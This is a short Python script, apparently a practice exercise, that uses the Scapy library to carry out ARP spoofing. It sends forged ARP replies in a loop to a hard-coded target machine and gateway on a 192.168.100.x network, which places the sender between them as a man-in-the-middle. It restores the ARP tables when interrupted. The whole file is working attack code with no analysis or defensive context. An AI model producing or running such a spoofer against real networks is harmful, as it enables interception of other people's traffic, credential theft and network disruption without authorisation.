#!/usr/bin/env python3
import scapy.all as scapy
import time

def scan(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        pass

def spoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    dest_mac = scan(destination_ip)
    source_mac = scan(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.100.7"
gateway_ip = "192.168.100.1"

# packet1 = scapy.ARP(op=2, pdst="192.168.100.1", hwdst="48:9D:D1:D1:FF:32", psrc="192.168.100.10")
# scapy.send(packet1)
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end=" ")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C pressed....Resetting ARP tables....Wait\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
